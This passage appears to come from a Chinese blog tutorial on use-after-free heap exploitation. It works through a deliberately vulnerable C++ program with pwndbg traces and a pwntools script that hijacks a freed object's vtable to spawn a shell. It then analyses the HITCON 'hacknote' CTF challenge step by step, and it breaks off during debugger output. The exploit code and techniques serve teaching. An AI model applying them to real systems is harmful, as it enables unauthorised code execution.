class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"class B"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    A *p = <span class="keyword">new</span> B();</span><br><span class="line">    <span class="keyword">delete</span> p;       <span class="comment">//删除堆p</span></span><br><span class="line">    fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line"></span><br><span class="line">    p-&gt;print();     <span class="comment">//继续使用p，触发漏洞，程序会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ use_after_free.cpp -o use_after_free -g -w -no-pie</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# ./UAF</span><br><span class="line">aaaa</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure>
<p>为什么错误呢？原因很简单，我们之前已经释放过p了，现在又来调用当然会错误，现在我们动态调试一下。<br>首先我们需要在main函数下个断点，然后单步观察</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0x400863: file UAF.cpp, line 32.</span><br></pre></td></tr></table></figure>
<p>我们运行到delete p的地方</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">34        delete p;       //删除堆p</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RBX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RCX  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RDX  0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RDI  0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x7ffff7a488c0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x602010 ◂— 0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdfe0 —▸ 0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line"> RIP  0x4008a1 (main+71) ◂— mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4008a1 &lt;main+71&gt;     mov    rax, qword ptr [rbp - 0x20]</span><br><span class="line">   0x4008a5 &lt;main+75&gt;     mov    esi, 8</span><br><span class="line">   0x4008aa &lt;main+80&gt;     mov    rdi, rax</span><br><span class="line">   0x4008ad &lt;main+83&gt;     call   0x400720</span><br><span class="line"> </span><br><span class="line">   0x4008b2 &lt;main+88&gt;     mov    rax, qword ptr [rip + 0x2007b7] &lt;0x601070&gt;</span><br><span class="line">   0x4008b9 &lt;main+95&gt;     mov    rdx, rax</span><br><span class="line">   0x4008bc &lt;main+98&gt;     mov    esi, 0x400</span><br><span class="line">   0x4008c1 &lt;main+103&gt;    lea    rdi, [rip + 0x2007b8] &lt;0x601080&gt;</span><br><span class="line">   0x4008c8 &lt;main+110&gt;    call   fgets@plt &lt;0x400740&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008cd &lt;main+115&gt;    lea    rdi, [rip + 0x2007ac] &lt;0x601080&gt;</span><br><span class="line">   0x4008d4 &lt;main+122&gt;    call   strdup@plt &lt;0x400750&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/Thunder_J/桌面/UAF.cpp</span><br><span class="line">   29 </span><br><span class="line">   30 int main()</span><br><span class="line">   31 &#123;</span><br><span class="line">   32     setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">   33     A *p = new B();</span><br><span class="line"> ► 34     delete p;       //删除堆p</span><br><span class="line">   35     fgets(buf,sizeof(buf),stdin);</span><br><span class="line">   36     char *q = strdup(buf);</span><br><span class="line">   37 </span><br><span class="line">   38     p-&gt;print();     //继续使用p，触发漏洞，程序会报错</span><br><span class="line">   39     return 0;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdfe0 —▸ 0x613e70 —▸ 0x600dc8 —▸ 0x400918 (B::print()) ◂— push   rbp</span><br><span class="line">01:0008│      0x7fffffffdfe8 —▸ 0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line">02:0010│      0x7fffffffdff0 —▸ 0x7fffffffe0e0 ◂— 0x1</span><br><span class="line">03:0018│      0x7fffffffdff8 ◂— 0x0</span><br><span class="line">04:0020│ rbp  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│      0x7fffffffe008 —▸ 0x7ffff767cb97 (__libc_start_main+231) ◂— mov    edi, eax</span><br><span class="line">06:0030│      0x7fffffffe010 ◂— 0xffffffffffffff90</span><br><span class="line">07:0038│      0x7fffffffe018 —▸ 0x7fffffffe0e8 —▸ 0x7fffffffe412 ◂— 0x73782f656d6f682f ('/home/xs')</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           4008a1 main+71</span><br><span class="line">   f 1     7ffff767cb97 __libc_start_main+231</span><br></pre></td></tr></table></figure>
<p>我们查看堆情况</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap p</span></span><br><span class="line">0x613e70 &#123;</span><br><span class="line">  mchunk_prev_size = 6294984, </span><br><span class="line">  mchunk_size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0xf181, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据p我们查看一下chunk指向的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x613e70-16</span></span><br><span class="line">0x613e60:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x613e70:	0x0000000000600dc8	0x0000000000000000</span><br><span class="line">0x613e80:	0x0000000000000000	0x000000000000f181</span><br><span class="line">0x613e90:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ea0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613eb0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ec0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ed0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ee0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x613ef0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x0000000000600dc8</span></span><br><span class="line">0x600dc8 &lt;_ZTV1B+16&gt;:	0x0000000000400918	0x0000000000000000</span><br><span class="line">0x600dd8 &lt;_ZTV1A+8&gt;:	0x0000000000600e00	0x00000000004008fc</span><br><span class="line">0x600de8 &lt;_ZTI1B&gt;:	0x00007ffff7dc7438	0x0000000000400a17</span><br><span class="line">0x600df8 &lt;_ZTI1B+16&gt;:	0x0000000000600e00	0x00007ffff7dc67f8</span><br><span class="line">0x600e08 &lt;_ZTI1A+8&gt;:	0x0000000000400a1a	0x0000000000000001</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x0000000000400918</span></span><br><span class="line">0x400918 &lt;B::print()&gt;:	0x10ec8348e5894855	0xe13d8d48f87d8948</span><br><span class="line">0x400928 &lt;B::print()+16&gt;:	0xfffffe00e8000000	0xe589485590c3c990</span><br><span class="line">0x400938 &lt;A::A()+4&gt;:	0x9d158d48f87d8948	0x48f8458b48002004</span><br><span class="line">0x400948 &lt;A::A()+20&gt;:	0x485590c35d901089	0x894810ec8348e589</span><br><span class="line">0x400958 &lt;B::B()+10&gt;:	0x8948f8458b48f87d	0x8d48ffffffcee8c7</span><br></pre></td></tr></table></figure>
<p>可以看到最终指向的地址是B中的print()函数，我们继续单步直到p-&gt;print()处，也就是漏洞触发之后，再次查看此内存</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10gx 0x613e70-16</span></span><br><span class="line">0x613e60:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x613e70:	0x6665656264616564	0x000000000000000a</span><br><span class="line">0x613e80:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x613e90:	0x6665656264616564	0x000000000000000a</span><br><span class="line">0x613ea0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到0x613e70处内容已经修改为我们写入的deadbeef，我们查看一下汇编</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disassemble /m main</span></span><br><span class="line">Dump of assembler code for function main():</span><br><span class="line">...</span><br><span class="line">38	    p-&gt;print();     //继续使用p，触发漏洞，程序会报错</span><br><span class="line">=&gt; 0x00000000004008dd &lt;+131&gt;:	mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004008e1 &lt;+135&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000004008e4 &lt;+138&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00000000004008e7 &lt;+141&gt;:	mov    rdx,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004008eb &lt;+145&gt;:	mov    rdi,rdx</span><br><span class="line">   0x00000000004008ee &lt;+148&gt;:	call   rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>我们查看寄存器信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RBX  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RCX  0xa666565626461</span><br><span class="line"> RDX  0xa</span><br><span class="line"> RDI  0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RSI  0x6665656264616564 ('deadbeef')</span><br><span class="line"> R8   0x613e99 ◂— 0x0</span><br><span class="line"> R9   0x7ffff7fd7d80 ◂— 0x7ffff7fd7d80</span><br><span class="line"> R10  0x6</span><br><span class="line"> R11  0x7ffff76f89a0 (strdup) ◂— push   rbp</span><br><span class="line"> R12  0x400760 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe0e0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffe000 —▸ 0x400980 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdfe0 —▸ 0x613e70 ◂— 'deadbeef\n'</span><br><span class="line"> RIP  0x4008dd (main+131) ◂— mov    rax, qword ptr [rbp - 0x20]</span><br></pre></td></tr></table></figure>
<p>我们发现RAX的内容就是我们输入的信息，结合汇编代码可以发现，最终的call rax这句代码将执行的我们输入的数据所指的地址的代码，也就是我们可以通过输入来getshell,我们通过IDA找到函数的地址</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./UAF'</span>)</span><br><span class="line">buf_addr = <span class="number">0x00601080</span></span><br><span class="line">sh_addr = <span class="number">0x0400847</span></span><br><span class="line">p.sendline(p64(buf_addr+<span class="number">8</span>) + p64(sh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Example-Two"><a href="#Example-Two" class="headerlink" title="Example Two"></a>Example Two</h3><p><strong>题目链接</strong></p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
<p><strong>解题思路</strong></p>
<p>首先运行一下程序，可以看到Menu中有一下几个选项：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure>
<p>我们分别来分析一下各个函数的功能：</p>
<p><strong>add_note</strong></p>
<p>可以看出该函数主要就是创建 note ，最多能够创建5个，每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)notelist[i] = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>print_note</strong></p>
<p>该函数就是输出相应note的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>delete_note</strong></p>
<p>该函数主要就是删除对应的note，但是在删除的时候只是进行了free而并没有置为NULL，这里就存在UAF漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以在IDA中看到程序有一个叫做magic的函数，它的作用就是 cat flag，所以我们只需要修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</p>
<p>因为note是一个fastbin chunk（大小为 16 字节），我们需要将note的put字段修改为magic函数的地址，而fastbin chunk是一个单链表有LIFO的特性，所以我们从申请入手，利用过程如下：</p>
<ol>
<li>申请 note0，real content size 为 16（大小不为8即可）</li>
<li>申请 note1，real content size 为 16（同上）</li>
<li>释放 note0</li>
<li>释放 note1</li>
<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则 note2 其实会分配 note1 对应的内存块。</li>
<li>real content 对应的 chunk 其实是 note0。</li>
<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
</ol>
<p>我们动态调试一下整个过程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">0x804b000 &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x151, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到我们的数据已经成功申请</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x804b150</span></span><br><span class="line">0x804b150:    0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b160:	0x0804b1700804865b	0x0000002100000000</span><br><span class="line">0x804b170:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x804b180:	0x0000000000000000	0x0000001100000000</span><br><span class="line">0x804b190:	0x0804b1a00804865b	0x0000002100000000</span><br><span class="line">0x804b1a0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x804b1b0:	0x0000000000000000	0x00021e4900000000</span><br><span class="line">0x804b1c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x804b1e0:	0x0000000000000000	